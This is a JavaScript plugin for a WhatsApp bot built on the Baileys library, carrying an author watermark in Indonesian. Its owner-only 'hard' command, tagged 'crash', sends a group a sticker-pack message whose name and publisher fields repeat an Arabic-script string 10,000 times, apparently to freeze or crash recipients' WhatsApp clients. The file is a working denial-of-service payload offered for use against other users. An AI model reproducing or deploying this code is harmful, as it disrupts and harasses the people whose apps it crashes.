/* 
by 𝐑𝐞𝐧𝐧𝐙𝐒𝐲𝐧𝐜
𝐋𝐘𝐍𝐍𝐀 𝐀𝐈 
ch: https://whatsapp.com/channel/0029VbCJ0B0K0IBlYlYJ0W3c
dont delete this watermark 
bisa kalian sesuai kan, mw di group/chat pribadi 
*/
const handler = async (m, {
  conn,
  usedPrefix,
  command,
  Func
}) => {
  if (!m.isGroup) return m.reply(Func.Styles(`> ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴅɪ ᴅᴀʟᴀᴍ ɢʀᴜᴘ.`))

  await m.react('💀')
  try {
    const baileys = await import("baileys")
    const generateWAMessageFromContent = baileys.generateWAMessageFromContent || baileys.default?.generateWAMessageFromContent

    if (typeof generateWAMessageFromContent !== 'function') throw new Error("ꜰᴜɴᴄᴛɪᴏɴ ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ʟɪʙʀᴀʀʏ")
    const msg = generateWAMessageFromContent(m.chat, {
      stickerPackMessage: {
        stickerPackId: "7b1760a6-472d-41b5-bbf5-e724c7de8604",
        name: "𝐑𝐞𝐧𝐧𝐙𝐒𝐲𝐧𝐜" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "𝐋𝐘𝐍𝐍𝐀 𝐀𝐈" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [{
          fileName: "iLkMr4xDw8I8jV2E02tx9KMtnUZsu18ClZ4JvkvKHd0=.webp",
          isAnimated: false,
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }],
        fileLength: "89684",
        fileSha256: "51VJsrdwSn9fwRckyTfsZIdnrAjZ9vIVgoenEJ0nv6k=",
        fileEncSha256: "UZDYZd1kJ6mREbgDAdfpqgjNmpSHtayTwvkH+4Yrn80=",
        mediaKey: "29ga9NVhHX1LWul9OWo7K+ROdGgFvXIQTrw3RmUMS64=",
        directPath: "/v/t62.15575-24/652905003_1418493843085030_5816252767151869696_n.enc?ccb=11-4",
        contextInfo: {},
        mediaKeyTimestamp: "1773502297",
        trayIconFileName: "7b1760a6-472d-41b5-bbf5-e724c7de8604.png",
        stickerPackSize: "89308",
        stickerPackOrigin: "USER_CREATED"
      }
    }, {})

    await conn.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    })

  } catch (e) {
    console.error(e)
    m.reply(Func.Styles(`> ᴇʀʀᴏʀ : ${e.message}`))
  }
}

handler.help = ['hard']
handler.tags = ['crash']
handler.command = /^(hard)$/i
handler.owner = true

export default handler
